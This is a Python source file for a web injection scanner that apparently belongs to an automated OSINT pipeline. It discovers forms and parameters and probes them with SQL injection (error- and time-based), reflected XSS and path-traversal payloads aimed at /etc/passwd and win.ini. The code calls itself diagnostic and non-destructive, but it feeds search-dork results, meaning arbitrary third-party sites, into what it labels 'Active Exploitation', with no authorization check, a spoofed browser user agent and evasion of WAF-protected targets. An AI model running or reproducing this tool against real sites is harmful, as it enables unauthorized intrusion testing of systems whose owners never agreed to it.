#!/usr/bin/env python3
"""
MCATester - payload_injector.py
Payload Injection Engine

Tests discovered login pages, forms, and API endpoints with safe
diagnostic payloads to confirm or rule out injection vulnerabilities.

Approach:
  1. Discover forms via HTML parsing
  2. Inject safe test payloads (no destructive operations)
  3. Analyze response differences — time, content, status, error messages
  4. Only report CONFIRMED vulnerabilities — never guesses

Safety rules:
  - Never use DROP, DELETE, or UPDATE payloads
  - Never use payloads that could modify server state
  - Always compare against a baseline (clean request first)
  - Respect rate limits — 2s between requests minimum
  - Skip targets with WAF detection (too noisy)

Supported test types:
  - SQL injection (error-based + time-based)
  - XSS reflection detection
  - Path traversal
  - IDOR parameter testing
  - Header injection
"""

import re
import time
import random
import hashlib
import requests
import urllib3
import logging
from urllib.parse import urljoin, urlparse, urlencode
from bs4 import BeautifulSoup

urllib3.disable_warnings()
logger = logging.getLogger("mcatester.injector")
logger.setLevel(logging.WARNING)

# ─────────────────────────────────────────────────────────────────────────────
# SAFE PAYLOAD SETS
# These payloads are diagnostic only — they reveal vulnerabilities
# without causing damage or modifying data
# ─────────────────────────────────────────────────────────────────────────────

SQLI_ERROR_PAYLOADS = [
    # Single quote — triggers syntax error in unparameterized queries
    ("'",                   "single_quote"),
    # Comment injection — tests if SQL comment terminates query
    ("'--",                 "comment_inject"),
    # OR injection — safe boolean test
    ("' OR '1'='1",         "or_true"),
    # Double quote variant
    ('"',                   "double_quote"),
]

SQLI_TIME_PAYLOADS = [
    # MySQL time-based blind — 3 second delay
    ("' AND SLEEP(3)--",    "mysql_sleep",   3),
    # MSSQL time-based
    ("'; WAITFOR DELAY '0:0:3'--", "mssql_wait", 3),
    # PostgreSQL time-based
    ("'; SELECT pg_sleep(3)--",    "pg_sleep",  3),
]

XSS_PAYLOADS = [
    # Simple reflection test — safe, no alert()
    ('<mcatest123>',              "tag_reflection"),
    ('"><mcatest123>',            "break_attr"),
    ("javascript:void(0)//mcatest", "js_proto"),
]

PATH_TRAVERSAL_PAYLOADS = [
    ("../../../etc/passwd",        "linux_passwd"),
    ("..\\..\\..\\windows\\win.ini", "windows_ini"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "url_encoded"),
]

# SQL error patterns that confirm injection
SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"mysql_fetch_array\(\)",
    r"ora-\d{4,5}",
    r"pg::syntaxerror",
    r"microsoft.*sql.*server",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"sql syntax.*error",
    r"warning.*mysql",
    r"supplied argument is not a valid mysql",
    r"invalid query",
    r"sql command not properly ended",
    r"column.*does not exist",
    r"table.*doesn.*t exist",
]

# XSS reflection patterns
XSS_CONFIRM_PATTERNS = [
    r"<mcatest123>",
    r'javascript:void\(0\)//mcatest',
]

# Path traversal confirmation patterns
TRAVERSAL_CONFIRM_PATTERNS = [
    r"root:x:\d+:\d+:",       # /etc/passwd
    r"\[extensions\]",          # win.ini
    r"\[fonts\]",               # win.ini
]

# ─────────────────────────────────────────────────────────────────────────────
# HTTP HELPER
# ─────────────────────────────────────────────────────────────────────────────

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/124.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
}


def http_request(method: str, url: str, data: dict = None,
                 params: dict = None, timeout: int = 12) -> dict:
    """Safe HTTP request with timing measurement."""
    try:
        start = time.time()
        if method.upper() == "POST":
            r = requests.post(url, data=data, headers=HEADERS,
                              timeout=timeout, verify=False,
                              allow_redirects=True)
        else:
            r = requests.get(url, params=params, headers=HEADERS,
                             timeout=timeout, verify=False,
                             allow_redirects=True)
        elapsed = time.time() - start
        return {
            "status":  r.status_code,
            "text":    r.text,
            "elapsed": elapsed,
            "headers": dict(r.headers),
            "url":     r.url,
            "hash":    hashlib.md5(r.text[:1000].encode()).hexdigest(),
        }
    except requests.Timeout:
        return {"status": 0, "text": "", "elapsed": timeout,
                "headers": {}, "url": url, "hash": "", "error": "timeout"}
    except Exception as e:
        return {"status": 0, "text": "", "elapsed": 0,
                "headers": {}, "url": url, "hash": "", "error": str(e)}


# ─────────────────────────────────────────────────────────────────────────────
# FORM DISCOVERY
# ─────────────────────────────────────────────────────────────────────────────

def discover_forms(url: str) -> list:
    """
    Fetch a page and extract all HTML forms with their fields.

    Returns list of form dicts:
    {
      "action": absolute URL,
      "method": "POST"|"GET",
      "fields": {field_name: default_value},
      "text_fields": [names of text/password inputs],
    }
    """
    resp = http_request("GET", url)
    if resp["status"] not in (200, 301, 302):
        return []

    forms = []
    try:
        soup = BeautifulSoup(resp["text"], "html.parser")
        base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"

        for form in soup.find_all("form"):
            action = form.get("action", "")
            method = form.get("method", "get").upper()

            # Resolve relative action URLs
            if not action:
                action = url
            elif action.startswith("/"):
                action = base + action
            elif not action.startswith("http"):
                action = urljoin(url, action)

            fields = {}
            text_fields = []

            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name", "")
                if not name:
                    continue
                itype = inp.get("type", "text").lower()
                value = inp.get("value", "")

                fields[name] = value

                if itype in ("text", "email", "search", "url", "tel",
                             "number", "password"):
                    text_fields.append(name)

                # Use safe defaults for hidden/submit fields
                elif itype == "hidden":
                    fields[name] = value  # keep original hidden values
                elif itype == "submit":
                    fields[name] = value or "Submit"

            if fields:
                forms.append({
                    "action":      action,
                    "method":      method,
                    "fields":      fields,
                    "text_fields": text_fields,
                    "source_url":  url,
                })

    except Exception as e:
        logger.warning(f"Form parsing error: {e}")

    return forms


def discover_api_params(url: str) -> list:
    """
    Extract URL parameters from a URL that might accept input.
    Returns list of parameter names to test.
    """
    parsed = urlparse(url)
    params = []

    # Extract from query string
    if parsed.query:
        for part in parsed.query.split("&"):
            if "=" in part:
                params.append(part.split("=")[0])

    # Detect common parameter patterns in path
    path_param_patterns = [
        r'[?&](\w+)=',
        r'/(\w+)/\d+',
        r'\?(\w+)=',
    ]
    for pattern in path_param_patterns:
        matches = re.findall(pattern, url)
        params.extend(matches)

    return list(set(params))


# ─────────────────────────────────────────────────────────────────────────────
# INJECTION TESTERS
# ─────────────────────────────────────────────────────────────────────────────

def test_sqli_error(url: str, form: dict, field: str) -> dict | None:
    """
    Test a single field for error-based SQL injection.
    Compares response to baseline — only reports confirmed errors.
    """
    # Get baseline first
    baseline_data = dict(form["fields"])
    baseline_data[field] = "testuser"
    baseline = http_request(form["method"], form["action"],
                             data=baseline_data if form["method"] == "POST"
                             else None,
                             params=baseline_data if form["method"] == "GET"
                             else None)
    time.sleep(1)

    for payload, payload_name in SQLI_ERROR_PAYLOADS:
        test_data = dict(form["fields"])
        test_data[field] = payload

        resp = http_request(
            form["method"], form["action"],
            data=test_data if form["method"] == "POST" else None,
            params=test_data if form["method"] == "GET" else None,
        )
        time.sleep(random.uniform(1.5, 2.5))

        if resp["status"] == 0:
            continue

        text_lower = resp["text"].lower()

        # Check for SQL error patterns
        for pattern in SQL_ERROR_PATTERNS:
            if re.search(pattern, text_lower):
                return {
                    "type":        "SQL Injection (Error-based)",
                    "severity":    "CRITICAL",
                    "url":         form["action"],
                    "field":       field,
                    "payload":     payload,
                    "payload_name": payload_name,
                    "evidence":    re.search(pattern, text_lower).group()[:200],
                    "status":      resp["status"],
                    "technique":   "error_based",
                    "baseline_status": baseline["status"],
                    "vuln_status": resp["status"],
                }

        # Check for significant content difference (might reveal data)
        if (baseline["hash"] != resp["hash"] and
                len(resp["text"]) > len(baseline["text"]) + 200):
            # Response grew significantly — possible data disclosure
            extra = resp["text"][len(baseline["text"]):]
            if any(re.search(p, extra.lower()) for p in SQL_ERROR_PATTERNS):
                return {
                    "type":     "SQL Injection (Data disclosure)",
                    "severity": "CRITICAL",
                    "url":      form["action"],
                    "field":    field,
                    "payload":  payload,
                    "evidence": extra[:200],
                    "status":   resp["status"],
                    "technique": "content_diff",
                }

    return None


def test_sqli_time(url: str, form: dict, field: str) -> dict | None:
    """
    Test for time-based blind SQL injection.
    Only confirms if response time is consistently >= delay threshold.
    """
    # Get baseline timing (average of 2 requests)
    baseline_data = dict(form["fields"])
    baseline_data[field] = "testuser"

    times = []
    for _ in range(2):
        resp = http_request(form["method"], form["action"],
                             data=baseline_data if form["method"] == "POST"
                             else None)
        times.append(resp["elapsed"])
        time.sleep(1)

    baseline_time = sum(times) / len(times)

    # Skip if baseline is already slow (> 3s) — server too slow to test
    if baseline_time > 3:
        return None

    for payload, payload_name, delay in SQLI_TIME_PAYLOADS:
        test_data = dict(form["fields"])
        test_data[field] = payload

        resp = http_request(
            form["method"], form["action"],
            data=test_data if form["method"] == "POST" else None,
            timeout=delay + 5,  # give extra time for the delay
        )
        time.sleep(2)

        # Confirm if response took significantly longer than baseline
        # Threshold: baseline + (delay * 0.8) to account for network variance
        if resp["elapsed"] >= baseline_time + (delay * 0.8):
            db_type = {
                "mysql_sleep": "MySQL",
                "mssql_wait":  "Microsoft SQL Server",
                "pg_sleep":    "PostgreSQL",
            }.get(payload_name, "Unknown DB")
            return {
                "type":          "SQL Injection (Time-based blind)",
                "severity":      "CRITICAL",
                "url":           form["action"],
                "field":         field,
                "payload":       payload,
                "payload_name":  payload_name,
                "db_type":       db_type,
                "evidence":      f"Response delayed {resp['elapsed']:.1f}s vs baseline {baseline_time:.1f}s ({db_type} backend confirmed)",
                "status":        resp["status"],
                "technique":     "time_based",
                "baseline_time": baseline_time,
                "vuln_time":     resp["elapsed"],
            }

    return None


def test_xss_reflection(url: str, form: dict, field: str) -> dict | None:
    """
    Test for reflected XSS — checks if payload appears unescaped in response.
    """
    for payload, payload_name in XSS_PAYLOADS:
        test_data = dict(form["fields"])
        test_data[field] = payload

        resp = http_request(
            form["method"], form["action"],
            data=test_data if form["method"] == "POST" else None,
            params=test_data if form["method"] == "GET" else None,
        )
        time.sleep(random.uniform(1.5, 2.0))

        if resp["status"] == 0:
            continue

        # Check if payload reflected unescaped in response
        for pattern in XSS_CONFIRM_PATTERNS:
            if re.search(pattern, resp["text"], re.I):
                return {
                    "type":      "Cross-Site Scripting (Reflected XSS)",
                    "severity":  "HIGH",
                    "url":       form["action"],
                    "field":     field,
                    "payload":   payload,
                    "evidence":  f"Payload '{payload}' reflected in response",
                    "status":    resp["status"],
                    "technique": "reflection",
                }

    return None


def test_path_traversal_param(url: str) -> dict | None:
    """
    Test URL parameters for path traversal.
    Specifically targets file-serving APIs like get-file-by-path.
    """
    parsed = urlparse(url)
    if not parsed.query:
        return None

    for payload, payload_name in PATH_TRAVERSAL_PAYLOADS:
        # Replace path parameter values with traversal payload
        new_params = []
        for part in parsed.query.split("&"):
            if "=" in part:
                key, _ = part.split("=", 1)
                if any(kw in key.lower() for kw in
                       ["path", "file", "dir", "document", "doc", "name"]):
                    import urllib.parse
                    new_params.append(f"{key}={urllib.parse.quote(payload)}")
                else:
                    new_params.append(part)
            else:
                new_params.append(part)

        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(new_params)}"
        resp = http_request("GET", test_url)
        time.sleep(random.uniform(1.5, 2.0))

        if resp["status"] not in (200, 206):
            continue

        for pattern in TRAVERSAL_CONFIRM_PATTERNS:
            if re.search(pattern, resp["text"]):
                return {
                    "type":      "Path Traversal",
                    "severity":  "CRITICAL",
                    "url":       test_url,
                    "payload":   payload,
                    "evidence":  re.search(pattern, resp["text"]).group()[:200],
                    "status":    resp["status"],
                    "technique": "path_traversal",
                }

    return None


# ─────────────────────────────────────────────────────────────────────────────
# WAF DETECTION
# ─────────────────────────────────────────────────────────────────────────────

def detect_waf(url: str) -> bool:
    """
    Quick WAF check — if canary payload returns identical blocked response,
    skip injection testing (results will be meaningless).
    """
    canary = "mcatester-waf-probe-12345"
    resp = http_request("GET", url, params={"test": canary})

    waf_signatures = [
        "access denied", "blocked", "forbidden", "security",
        "waf", "firewall", "cloudflare", "akamai", "imperva",
        "you don't have permission", "request blocked",
    ]
    text_lower = resp["text"].lower()
    return any(sig in text_lower for sig in waf_signatures)


# ─────────────────────────────────────────────────────────────────────────────
# MAIN INJECTION RUNNER
# ─────────────────────────────────────────────────────────────────────────────

class PayloadInjector:
    """
    Main payload injection engine.
    Discovers forms, tests fields, reports confirmed vulnerabilities.
    """

    def __init__(self, rate_limit: float = 2.0):
        self.rate_limit = rate_limit  # seconds between requests
        self.results    = []
        self.tested     = set()       # URLs already tested

    def test_login_page(self, url: str) -> list:
        """
        Full test suite on a login page.
        Tests all form fields for SQLi and XSS.
        """
        if url in self.tested:
            return []
        self.tested.add(url)

        print(f"\n  [Injector] Testing: {url}")
        findings = []

        # Discover forms
        forms = discover_forms(url)
        if not forms:
            print(f"  [Injector] No forms found — trying direct parameter test")
            # Try path traversal on URL params
            result = test_path_traversal_param(url)
            if result:
                findings.append(result)
                print(f"  [CRITICAL] Path traversal confirmed: {url}")
            return findings

        print(f"  [Injector] Found {len(forms)} form(s)")

        for i, form in enumerate(forms):
            print(f"  [Injector] Form {i+1}: {form['method']} → {form['action']}")
            print(f"             Fields: {list(form['fields'].keys())}")

            if not form["text_fields"]:
                print(f"  [Injector] No injectable text fields found")
                continue

            for field in form["text_fields"][:3]:  # max 3 fields per form
                print(f"  [Injector] Testing field: {field}")

                # Test 1: Error-based SQLi
                result = test_sqli_error(url, form, field)
                if result:
                    findings.append(result)
                    print(f"  [CRITICAL] SQLi error-based: {field} in {form['action']}")
                    print(f"             Evidence: {result['evidence'][:80]}")
                    break  # Field is confirmed vulnerable — skip other tests

                # Test 2: XSS reflection
                result = test_xss_reflection(url, form, field)
                if result:
                    findings.append(result)
                    print(f"  [HIGH] XSS reflected: {field} in {form['action']}")

                time.sleep(self.rate_limit)

            # Test 3: Time-based SQLi only if no error-based found
            # (slower — only run if error-based missed it)
            if not any(f["technique"] == "error_based" for f in findings):
                for field in form["text_fields"][:2]:
                    result = test_sqli_time(url, form, field)
                    if result:
                        findings.append(result)
                        print(f"  [CRITICAL] SQLi time-based: {field}")
                        print(f"             {result['evidence']}")
                        break

        return findings

    def test_api_endpoint(self, url: str) -> list:
        """
        Test API endpoints with path traversal and parameter injection.
        Specifically for file-serving APIs like get-file-by-path.
        """
        if url in self.tested:
            return []
        self.tested.add(url)

        print(f"\n  [Injector] API test: {url[:80]}")
        findings = []

        result = test_path_traversal_param(url)
        if result:
            findings.append(result)
            print(f"  [CRITICAL] Path traversal confirmed!")
            print(f"             Payload: {result['payload']}")
            print(f"             Evidence: {result['evidence'][:80]}")

        return findings

    def run(self, target_findings: list) -> list:
        """
        Main entry point — takes confirmed findings from pipeline,
        extracts login pages and API endpoints, tests them.

        Args:
            target_findings: confirmed findings from osint_agent.py

        Returns:
            list of confirmed injection vulnerabilities
        """
        all_injection_findings = []

        # Categorize targets
        login_urls = []
        api_urls   = []

        for f in target_findings:
            url   = f.get("url", "")
            vtype = f.get("vuln_type", "").lower()
            cat   = f.get("category", "").lower()
            src   = f.get("source", "")

            url_lower = url.lower()

            # Login pages
            if any(kw in url_lower for kw in
                   ["login", "signin", "auth", "logon", "signon"]):
                login_urls.append(url)

            # File-serving APIs
            elif any(kw in url_lower for kw in
                     ["get-file", "file?path", "cdn?path", "getdocument",
                      "download", "file-by-path"]):
                api_urls.append(url)

            # Forms from dork results
            elif any(kw in url_lower for kw in
                     [".jsp", ".php", ".do", ".action", "portal", "form"]):
                login_urls.append(url)

        # Filter out URLs that already contain injection payloads
        # These come from dork results where someone already injected them
        SKIP_PATTERNS = [
            "union+select", "union select", "or+1=1", "or 1=1",
            "sleep(", "waitfor", "onmouseover", "script>",
            "concat(", "%27", "'+or+", "'+union",
        ]
        login_urls = [
            u for u in login_urls
            if not any(p in u.lower() for p in SKIP_PATTERNS)
        ]
        api_urls = [
            u for u in api_urls
            if not any(p in u.lower() for p in SKIP_PATTERNS)
        ]

        # Deduplicate
        login_urls = list(dict.fromkeys(login_urls))[:5]  # max 5 login pages
        api_urls   = list(dict.fromkeys(api_urls))[:3]    # max 3 API endpoints

        print(f"\n  [Injector] Login pages to test : {len(login_urls)}")
        print(f"  [Injector] API endpoints to test: {len(api_urls)}")

        if not login_urls and not api_urls:
            print("  [Injector] No injectable targets found in findings")
            return []

        # WAF pre-check — if first 2 login pages return 403
        # the WAF is blocking everything, injection wastes 3 minutes
        if login_urls:
            blocked = sum(1 for url in login_urls[:2]
                         if http_request("GET", url).get("status") == 403)
            if blocked >= 2:
                print(f"  [Injector] All login pages returning 403 — WAF active")
                print(f"  [Injector] Skipping form injection (saves ~2 minutes)")
                login_urls = []  # still test APIs below

        # Test login pages
        for url in login_urls:
            results = self.test_login_page(url)
            all_injection_findings.extend(results)
            time.sleep(self.rate_limit)

        # Test API endpoints
        for url in api_urls:
            results = self.test_api_endpoint(url)
            all_injection_findings.extend(results)
            time.sleep(self.rate_limit)

        # Deduplicate — same path + field + technique = same finding
        # Keep one per (normalized_path, field, technique) combo
        seen = set()
        deduped = []
        for f in all_injection_findings:
            from urllib.parse import urlparse
            p = urlparse(f["url"])
            # Normalize: strip scheme+port for dedup key
            key = (p.path, f.get("field", ""), f.get("technique", ""))
            if key not in seen:
                seen.add(key)
                deduped.append(f)
            else:
                pass  # same vuln on different scheme/port — skip

        self.results = deduped
        return deduped


def run_payload_injection(findings: list,
                          dork_urls: dict = None) -> list:
    """
    Drop-in function for osint_agent.py.

    Args:
        findings:  confirmed findings list from pipeline
        dork_urls: raw dork URL dict for additional targets

    Returns:
        list of injection vulnerability findings
    """
    # Merge dork URLs as synthetic findings for login page detection
    all_targets = list(findings)
    if dork_urls:
        for url in dork_urls:
            url_lower = url.lower()
            if any(kw in url_lower for kw in
                   ["login", "signin", ".jsp", ".php", ".do",
                    "get-file", "file?path"]):
                all_targets.append({
                    "url":       url,
                    "vuln_type": "Potential injection target",
                    "severity":  "INFO",
                    "confirmed": False,
                    "source":    "dork",
                })

    injector = PayloadInjector(rate_limit=1.0)
    results  = injector.run(all_targets)

    # Format results as standard finding dicts
    formatted = []
    for r in results:
        formatted.append({
            "url":       r["url"],
            "severity":  r["severity"],
            "vuln_type": r["type"],
            "summary":   f"{r['type']} confirmed in field '{r.get('field','param')}' — {r.get('evidence','')[:100]}",
            "confirmed": True,
            "source":    "payload_injection",
            "category":  "Active Exploitation",
            "status":    r.get("status", 0),
            "evidence":  {
                "payload":    [r.get("payload", "")],
                "field":      [r.get("field", "param")],
                "technique":  [r.get("technique", "")],
                "evidence":   [r.get("evidence", "")[:200]],
            },
            "fix": _get_fix(r["type"]),
        })

    return formatted


def _get_fix(vuln_type: str) -> str:
    """Return a brief fix recommendation for each vuln type."""
    fixes = {
        "SQL Injection": "Use parameterized queries / prepared statements. Never concatenate user input into SQL strings.",
        "Cross-Site Scripting": "HTML-encode all user input before rendering. Implement Content-Security-Policy header.",
        "Path Traversal": "Validate and sanitize file path inputs. Use a whitelist of allowed paths. Never pass user input directly to file system functions.",
    }
    for key, fix in fixes.items():
        if key.lower() in vuln_type.lower():
            return fix
    return "Validate and sanitize all user input. Use parameterized queries and output encoding."


# ─────────────────────────────────────────────────────────────────────────────
# STANDALONE TEST
# python payload_injector.py
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=" * 55)
    print("  Payload Injector — Standalone Test")
    print("=" * 55)

    # Test on deliberately vulnerable targets
    test_targets = [
        {
            "url":       "https://demo.testfire.net/login.jsp",
            "vuln_type": "Login Portal Discovered",
            "severity":  "MEDIUM",
            "confirmed": True,
            "source":    "infrastructure",
        },
        {
            "url":       "http://testphp.vulnweb.com/login.php",
            "vuln_type": "Login Portal Discovered",
            "severity":  "MEDIUM",
            "confirmed": True,
            "source":    "infrastructure",
        },
    ]

    print("\nTargets:")
    for t in test_targets:
        print(f"  → {t['url']}")

    print("\nRunning injection tests...")
    print("(This will take 2-4 minutes due to rate limiting)\n")

    results = run_payload_injection(test_targets)

    print(f"\n{'='*55}")
    print(f"  Results: {len(results)} confirmed vulnerabilities")
    print(f"{'='*55}")

    if results:
        for r in results:
            print(f"\n  [{r['severity']}] {r['vuln_type']}")
            print(f"  URL    : {r['url']}")
            print(f"  Summary: {r['summary'][:100]}")
            print(f"  Fix    : {r['fix'][:80]}")
    else:
        print("  No injection vulnerabilities confirmed")
        print("  (Targets may be patched or unreachable)")